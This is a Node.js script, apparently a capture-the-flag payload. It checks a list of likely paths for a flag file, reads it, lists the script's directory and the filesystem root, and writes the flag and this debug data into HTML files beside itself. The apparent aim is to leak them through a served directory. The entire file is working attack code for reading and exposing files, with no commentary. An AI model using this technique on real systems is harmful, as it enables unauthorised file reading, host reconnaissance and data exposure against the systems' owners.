// flaggrab_2f9c.js
const fs = require("fs");
const path = require("path");

const candidates = [
  "/flag.txt",
  "/app/flag.txt",
  "/opt/chal/flag.txt",
  "/home/node/flag.txt",
  path.join(process.cwd(), "flag.txt"),
  "flag.txt",
];

let flag = null;
for (const p of candidates) {
  try { flag = fs.readFileSync(p, "utf8"); break; } catch {}
}
if (!flag) flag = "FLAG NOT FOUND";

const debugObj = {
  cwd: process.cwd(),
  __dirname,
  tried: candidates,
  snapshots_dir_files: (() => { try { return fs.readdirSync(__dirname); } catch (e) { return String(e); } })(),
  root_dir_files: (() => { try { return fs.readdirSync("/"); } catch (e) { return String(e); } })(),
};

function esc(s) {
  return String(s).replace(/[&<>"]/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;" }[c]));
}

fs.writeFileSync(path.join(__dirname, "debug.html"), `<pre>${esc(JSON.stringify(debugObj, null, 2))}</pre>`);
fs.writeFileSync(path.join(__dirname, "flag.html"), `<pre>${esc(flag)}</pre>`);
